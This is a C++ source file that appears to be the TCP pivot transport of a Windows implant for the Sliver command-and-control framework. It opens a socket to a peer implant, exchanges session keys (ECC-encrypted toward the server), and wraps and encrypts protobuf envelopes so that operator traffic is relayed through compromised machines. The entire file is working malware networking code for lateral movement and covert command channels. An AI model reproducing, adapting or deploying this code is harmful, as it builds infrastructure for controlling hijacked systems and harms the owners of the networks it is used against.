#if defined(PIVOT) && defined(TCPPIVOT)
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include "Client.h"
#include "pivots.h"
#include "CryptoUtils.h"
#include "constants.h"
#include <regex>

using namespace std;

namespace transports {

	TCPClient::TCPClient(const string& _bind_address) : bind_address(_bind_address){
		bind_address = regex_replace(bind_address, std::regex("tcppivot://"), "");
        WSADATA wsaData;
        this->connect_socket = INVALID_SOCKET;
		this->addr_info = NULL;
        struct addrinfo    hints;
        int iResult;

        // Initialize Winsock
        iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != 0) {
            printf("WSAStartup failed with error: %d\n", iResult);
            return;
        }

        ZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        auto hostname = bind_address.substr(0, bind_address.find(":"));
        auto port = bind_address.substr(bind_address.find(":") + 1, bind_address.size() - 1);

        // Resolve the server address and port
        iResult = getaddrinfo(hostname.c_str(), port.c_str(), &hints, &this->addr_info);
        if (iResult != 0) {
            printf("getaddrinfo failed with error: %d\n", iResult);
            WSACleanup();
            return;
        }
        this->connect_socket = socket(this->addr_info->ai_family, this->addr_info->ai_socktype,
			this->addr_info->ai_protocol);
		int recvbufsize = 0x10000;
		int sendbufsize = 0x10000;
		setsockopt(this->connect_socket, SOL_SOCKET, SO_RCVBUF, (char*)&recvbufsize, sizeof(int));
		setsockopt(this->connect_socket, SOL_SOCKET, SO_SNDBUF, (char*)&sendbufsize, sizeof(int));
		if (this->connect_socket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return;
        }

    }

    bool TCPClient::SessionInit() {
		if (this->connect_socket != INVALID_SOCKET) {
			closesocket(this->connect_socket);
		}
		this->connect_socket = socket(this->addr_info->ai_family, this->addr_info->ai_socktype,
			this->addr_info->ai_protocol);
		if (this->connect_socket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			return false;
		}
		auto iResult = connect(this->connect_socket, this->addr_info->ai_addr, (int)(this->addr_info->ai_addrlen));
		if (iResult == SOCKET_ERROR) {
			return false;
		}

		auto id = pivots::generatePeerID();
		//peer key exchange
		sliverpb::PivotHello req;
		req.set_peerid(id);
		string serialized;
		req.SerializeToString(&serialized);
		this->write(serialized);
		auto received = this->read();
		sliverpb::PivotHello resp;
		resp.ParseFromString(received);
		this->peer_ctx.SetKey(resp.sessionkey());

		//server key exchange
		auto key = crypto::RandomKey();
		this->server_ctx.SetKey(key);
		auto enc = crypto::ECCEncryptToServer(key);
		sliverpb::PivotServerKeyExchange server_req;
		server_req.set_sessionkey(enc);
		server_req.set_originid(pivots::generatePeerID());
		string server_req_serialized;
		server_req.SerializeToString(&server_req_serialized);
		sliverpb::PivotPeerEnvelope peer_env;
		peer_env.set_type(sliverpb::MsgPivotServerKeyExchange);
		peer_env.set_data(server_req_serialized);
		auto p = peer_env.add_peers();
		p->set_name("PIVOT_PEER");
		p->set_peerid(pivots::getPeerID());
		string serialized_pivotpeerenvelope;
		peer_env.SerializeToString(&serialized_pivotpeerenvelope);
		sliverpb::Envelope serverkeyex_envelope;
		serverkeyex_envelope.set_data(serialized_pivotpeerenvelope);
		serverkeyex_envelope.set_type(sliverpb::MsgPivotPeerEnvelope);
		string final_serialized;
		serverkeyex_envelope.SerializeToString(&final_serialized);
		auto enc2 = this->peer_ctx.Encrypt(final_serialized);
		this->write(enc2);
		auto resp_from_server = this->ReadEnvelopeBlocking();
		sliverpb::PivotServerKeyExchange keyex_resp;
		keyex_resp.ParseFromString(resp_from_server->data());
		this->pivotSessionID = keyex_resp.sessionkey();
		return true;
	}

	string TCPClient::read() {
		fd_set fds;
		FD_ZERO(&fds);
		FD_SET(this->connect_socket, &fds);
		auto ret = select(0, &fds, NULL, NULL, NULL);
		if (ret) {
		int res = 0;
			SIZE_T len = 0;
			res = recv(this->connect_socket, (char*)&len, sizeof(SIZE_T), 0);
			if (res == 0 || res == SOCKET_ERROR) {
				throw exception("read failed");
			}
			std::string out;
			out.resize(len);
			res = recv(this->connect_socket, (char*)out.c_str(), len, 0);
			if (res == 0 || res == SOCKET_ERROR) {
				throw exception("read failed");
			}
			return out;
		}
		else {
			throw exception("read failed");
		}
	}

	bool TCPClient::write(const string& in) {
		DWORD written = 0;
		fd_set fds;
		FD_ZERO(&fds);
		FD_SET(this->connect_socket, &fds);
		auto ret = select(0, NULL, &fds, NULL, NULL);
		if (ret) {
			SIZE_T len = in.size();
			written = send(this->connect_socket, (char*)&len, sizeof len, 0);
			if (written != sizeof len)
				throw exception("send failed");
			written = send(this->connect_socket, (char*)in.c_str(), len, 0);
			if (written != len)
				throw exception("send failed");
			return true;
		}
		throw exception("send failed");
	}

	bool TCPClient::WriteAndReceive(const sliverpb::Envelope& to_send, sliverpb::Envelope& recv) {
		unique_lock<std::mutex> lk{ pollMutex };
		sliverpb::Envelope env = to_send;
		if (this->WriteEnvelope(env)) {
			auto resp = this->ReadEnvelopeBlocking();
			if (resp != nullptr) {
				recv = *(resp.get());
				return true;
			}
		}
		return false;
	}
	unique_ptr<sliverpb::Envelope> TCPClient::ReadEnvelopeBlocking() {
		auto data = this->read();
		auto plain = this->peer_ctx.Decrypt(data);
		unique_ptr<sliverpb::Envelope> incomingEnvelope = make_unique<sliverpb::Envelope>();
		incomingEnvelope->ParseFromString(plain);
		if (incomingEnvelope->type() != sliverpb::MsgPivotPeerEnvelope) {
			return nullptr;
		}
		auto peerEnv = make_unique<sliverpb::PivotPeerEnvelope>();
		peerEnv->ParseFromString(incomingEnvelope->data());
		if (peerEnv->peers()[0].peerid() != pivots::getPeerID()) {
			return incomingEnvelope;
		}
		plain = this->server_ctx.Decrypt(peerEnv->data());
		unique_ptr<sliverpb::Envelope> env = make_unique<sliverpb::Envelope>();
		env->ParseFromString(plain);
		return env;
	}
	unique_ptr<sliverpb::Envelope> TCPClient::ReadEnvelope() {
		if (!this->Check()) {
			return nullptr;
		}
		auto data = this->read();
		auto plain = this->peer_ctx.Decrypt(data);
		unique_ptr<sliverpb::Envelope> incomingEnvelope = make_unique<sliverpb::Envelope>();
		incomingEnvelope->ParseFromString(plain);
		if (incomingEnvelope->type() != sliverpb::MsgPivotPeerEnvelope) {
			return nullptr;
		}
		auto peerEnv = make_unique<sliverpb::PivotPeerEnvelope>();
		peerEnv->ParseFromString(incomingEnvelope->data());
		if (peerEnv->peers()[0].peerid() != pivots::getPeerID()) {
			return incomingEnvelope;
		}
		plain = this->server_ctx.Decrypt(peerEnv->data());
		unique_ptr<sliverpb::Envelope> env = make_unique<sliverpb::Envelope>();
		env->ParseFromString(plain);
		return env;
	}
	bool TCPClient::Check() {
		return true;
	}
	bool TCPClient::WriteEnvelope_nolock(sliverpb::Envelope& env) {
		string serialized;
		env.SerializeToString(&serialized);
		string finalSerialized;
		if (env.type() != sliverpb::MsgPivotPeerEnvelope) {
			auto enc = this->server_ctx.Encrypt(serialized);
			sliverpb::PivotPeerEnvelope peerEnv;
			peerEnv.set_pivotsessionid(this->pivotSessionID);
			peerEnv.set_type(sliverpb::MsgPivotSessionEnvelope);
			peerEnv.set_data(enc);
			auto p = peerEnv.add_peers();
			p->set_name("PIVOT_PEER");
			p->set_peerid(pivots::getPeerID());
			string serialized_peerEnv;
			peerEnv.SerializeToString(&serialized_peerEnv);
			sliverpb::Envelope envelope;
			envelope.set_data(serialized_peerEnv);
			envelope.set_type(sliverpb::MsgPivotPeerEnvelope);

			envelope.SerializeToString(&finalSerialized);
		}
		else {
			finalSerialized = serialized;
		}
		auto enc = this->peer_ctx.Encrypt(finalSerialized);
		return this->write(enc);
	}


	bool TCPClient::WriteEnvelope(sliverpb::Envelope& env) {
		string serialized;
		env.SerializeToString(&serialized);
		string finalSerialized;
		if (env.type() != sliverpb::MsgPivotPeerEnvelope && env.type() != sliverpb::MsgPivotPeerEnvelopeNoResponse) {
			auto enc = this->server_ctx.Encrypt(serialized);
			sliverpb::PivotPeerEnvelope peerEnv;
			peerEnv.set_pivotsessionid(this->pivotSessionID);
			peerEnv.set_type(sliverpb::MsgPivotSessionEnvelope);
			peerEnv.set_data(enc);
			auto p = peerEnv.add_peers();
			p->set_name("PIVOT_PEER");
			p->set_peerid(pivots::getPeerID());
			string serialized_peerEnv;
			peerEnv.SerializeToString(&serialized_peerEnv);
			sliverpb::Envelope envelope;
			envelope.set_data(serialized_peerEnv);
			envelope.set_type(sliverpb::MsgPivotPeerEnvelope);
			envelope.SerializeToString(&finalSerialized);
		}
		else {
			finalSerialized = serialized;
		}
		auto enc = this->peer_ctx.Encrypt(finalSerialized);
		return this->write(enc);
	}

	bool TCPClient::WriteEnvelopeNoResp(sliverpb::Envelope& env) {
		unique_lock<std::mutex> lk{ pollMutex };
		string serialized;
		env.SerializeToString(&serialized);
		string finalSerialized;
		if (env.type() != sliverpb::MsgPivotPeerEnvelope && env.type() != sliverpb::MsgPivotPeerEnvelopeNoResponse) {
			auto enc = this->server_ctx.Encrypt(serialized);
			sliverpb::PivotPeerEnvelope peerEnv;
			peerEnv.set_pivotsessionid(this->pivotSessionID);
			peerEnv.set_type(sliverpb::MsgPivotSessionEnvelope);
			peerEnv.set_data(enc);
			auto p = peerEnv.add_peers();
			p->set_name("PIVOT_PEER");
			p->set_peerid(pivots::getPeerID());
			string serialized_peerEnv;
			peerEnv.SerializeToString(&serialized_peerEnv);
			sliverpb::Envelope envelope;
			envelope.set_data(serialized_peerEnv);
			envelope.set_type(sliverpb::MsgPivotPeerEnvelopeNoResponse);
			envelope.SerializeToString(&finalSerialized);
		}
		else {
			finalSerialized = serialized;
		}
		auto enc = this->peer_ctx.Encrypt(finalSerialized);
		return this->write(enc);
	}
}


#endif